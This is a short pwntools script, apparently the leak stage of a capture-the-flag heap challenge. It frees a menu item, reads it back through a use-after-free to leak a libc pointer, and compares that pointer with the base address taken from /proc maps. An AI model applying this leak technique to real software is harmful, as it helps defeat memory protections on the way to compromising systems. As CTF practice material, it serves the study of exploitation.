from pwn import *

context.log_level = "error"

def libc_base_from_maps(pid: int) -> int:
    with open(f"/proc/{pid}/maps", "r") as f:
        for line in f:
            if "libc.so.6" in line and "r-xp" in line:
                return int(line.split("-")[0], 16)
    raise RuntimeError("Could not find libc base in /proc/<pid>/maps")

def start():
    return process(["./ld-linux-x86-64.so.2", "--library-path", ".", "./chal"])

def menu(io, choice: int):
    io.sendlineafter(b"> ", str(choice).encode())

def buy(io, idx: int):
    menu(io, 1)
    io.sendlineafter(b"idx?: > ", str(idx).encode())

def sell(io, idx: int):
    menu(io, 4)
    io.sendlineafter(b"> ", str(idx).encode())

def admire(io, idx: int) -> bytes:
    menu(io, 3)
    io.sendlineafter(b"> ", str(idx).encode())
    return io.recvn(0x400)

io = start()
pid = io.pid

buy(io, 0)
sell(io, 0)

data = admire(io, 0)
fd = u64(data[0:8])

base = libc_base_from_maps(pid)
delta = fd - base

print(f"fd_leak = {hex(fd)}")
print(f"libc_base(local) = {hex(base)}")
print(f"DELTA(fd - base) = {hex(delta)}")

io.close()
